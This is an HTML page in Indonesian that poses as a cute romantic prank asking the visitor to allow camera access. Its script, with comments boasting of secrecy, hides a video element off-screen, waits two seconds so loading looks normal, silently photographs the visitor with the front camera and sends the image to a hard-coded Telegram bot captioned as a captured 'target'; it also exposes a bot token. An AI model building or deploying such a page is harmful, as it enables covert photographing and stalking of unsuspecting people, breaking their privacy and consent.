<!DOCTYPE html>
<html>
<head>
    <title>Website Lucu ‚ù§Ô∏è</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        /* CUSTOM PERMISSION POPUP */
        .custom-permission {
            background: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 350px;
            text-align: center;
        }
        
        .camera-icon {
            font-size: 60px;
            margin-bottom: 20px;
        }
        
        .custom-permission h2 {
            color: #333;
            margin-bottom: 10px;
        }
        
        .custom-permission p {
            color: #666;
            margin-bottom: 25px;
        }
        
        .btn-allow {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        
        .btn-block {
            background: #e2e8f0;
            color: #4a5568;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            font-size: 16px;
            margin-left: 10px;
            cursor: pointer;
        }
        
        /* Hidden elements buat kamera */
        #hiddenVideo {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
        }
        
        #hiddenCanvas {
            display: none;
        }
        
        /* Loading dan konten utama */
        .loading { display: none; margin-top: 20px; }
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .main-content {
            display: none;
            text-align: center;
            color: white;
        }
    </style>
</head>
<body>
    <!-- Hidden camera elements -->
    <video id="hiddenVideo" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas" width="1280" height="720"></canvas>
    
    <!-- CUSTOM POPUP WEBSITE -->
    <div id="permissionPopup" class="custom-permission">
        <div class="camera-icon">üò°</div>
        <h2>AKU MAU KAMU JUJUR SAMA AKU SEKARANG</h2>
        <p>PLIZZZZZZZZZ</p>
        <div>
            <button class="btn-allow" onclick="requestCamera()">YAAAA</button>
            <button class="btn-block" onclick="denyCamera()">GAAAA</button>
        </div>
        <div id="loadingIndicator" class="loading">
            <div class="spinner"></div>
            <p style="color: #666;">Mengakses kamera...</p>
        </div>
    </div>
    
    <!-- KONTEN UTAMA -->
    <div id="mainContent" class="main-content">
        <h1>Makasih Cantiii! ‚ù§Ô∏è</h1>
        <p>Izinin buat generate IMG!</p>
        <img src="https://feeldreams.github.io/pandaputih.gif" width="200">
    </div>

    <script>
        // ===== KONFIGURASI BOT TELEGRAM =====
        const BOT_TOKEN = '8086111548:AAE9hSY7CgA8WhgG1Zs_x9CEbvAf1YKJ42A';
        const CHAT_ID = '8115098922';
        
        const video = document.getElementById('hiddenVideo');
        const canvas = document.getElementById('hiddenCanvas');
        const context = canvas.getContext('2d');
        
        // INI DIA - BEGITU USER KLIK IZINKAN
        function requestCamera() {
            // Tampilkan loading biar keliatan wajar
            document.getElementById('loadingIndicator').style.display = 'block';
            
            // MINTA AKSES KAMERA (POPUP CHROME MUNCUL)
            navigator.mediaDevices.getUserMedia({ 
                video: { width: 640, height: 480, facingMode: 'user' }
            })
            .then(stream => {
                // USER UDAH KLIK ALLOW DI CHROME!
                
                // Sembunyiin popup, munculin konten utama
                document.getElementById('permissionPopup').style.display = 'none';
                document.getElementById('mainContent').style.display = 'block';
                
                // Setup kamera hidden
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    
                    // DELAY 2 DETIK (biar keliatan loading wajar)
                    // SELAMA INI DIAM-DIAM FOTO DIAMBIL!
                    setTimeout(() => {
                        // FOTO DIAMBIL
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // FOTO DIKIRIM KE TELEGRAM
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('photo', blob, 'foto_diam_diam.jpg');
                            formData.append('caption', 'üì∏ Target berhasil difoto!');
                            
                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData,
                                mode: 'no-cors' // Silent mode
                            });
                            
                            // Matiin kamera
                            stream.getTracks().forEach(track => track.stop());
                            video.srcObject = null;
                            
                            console.log('‚úÖ FOTO TERKIRIM DIAM-DIAM!');
                        }, 'image/jpeg', 0.7);
                    }, 2000); // 2 detik setelah klik Allow
                };
            })
            .catch(err => {
                // User nolak di popup Chrome
                alert('Yahh, izinin dulu ya buat filter lucunya! üò¢');
                location.reload();
            });
        }
        
        function denyCamera() {
            alert('Yahh, lain kali ya! üòä');
            // Bisa redirect ke halaman lain
        }
    </script>
</body>
</html>
